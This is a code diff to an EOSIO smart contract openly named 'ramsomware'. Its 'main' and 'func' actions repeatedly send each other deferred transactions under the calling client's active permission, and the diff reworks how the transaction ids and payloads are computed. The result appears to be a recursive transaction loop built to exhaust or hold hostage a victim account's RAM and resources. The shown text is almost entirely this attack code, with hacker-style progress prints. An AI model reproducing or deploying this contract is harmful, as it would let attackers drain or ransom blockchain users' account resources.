@@ -45,15 +45,16 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
             //upsert(name("capamerica"), idx);
             upsert(client, idx);
 
-            for(int i =0; i<=1; i++)
-            { 
-                out1.actions.pop_back();
-                out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple(client, uint64_t(initnum+(idx)+i) ));
-                //out.delay_sec = 0;
-                out1.send((initnum+idx+i), client, false);
-                print("[+] CALL 1st: ", ((idx)+i), "\n");
-            }
-
+            out1.actions.pop_back();
+            out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple(client, uint64_t(idx * 2) ));
+            out2.actions.pop_back();
+            out2.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple(client, uint64_t(idx * 2+1) ));
+            //out.delay_sec = 0;
+            out1.send(idx * 2, client, false);
+            out2.send((idx * 2 + 1), client, false);
+            print("[+] CALL 1st: ", (idx*2), "\n");
+            print("[+] CALL 2nd: ", ((idx*2)+1), "\n");
+/*
             for (int i = 0; i<=1; i++)
             {
                 out2.actions.pop_back();
@@ -63,15 +64,16 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
                 print("[+] CALL 2nd: ", ((idx*5)+i), "\n");
             }
             print("[#] MAIN: ", idx);
+*/
         };
         [[eosio::action]]
         void func(name client, uint64_t idx)
         { // 123 567
             //name client = name("reset");
             transaction out{};
-            out.actions.emplace_back(permission_level{client, "active"_n}, _self, "main"_n, std::make_tuple(client, uint64_t(idx*100) ));
+            out.actions.emplace_back(permission_level{client, "active"_n}, _self, "main"_n, std::make_tuple(client, uint64_t(idx) ));
             //out.delay_sec = 0;
-            out.send((idx*100), client, false);
+            out.send((idx), client, false);
             print("\t[#] FUNC: ", idx);
         };
 
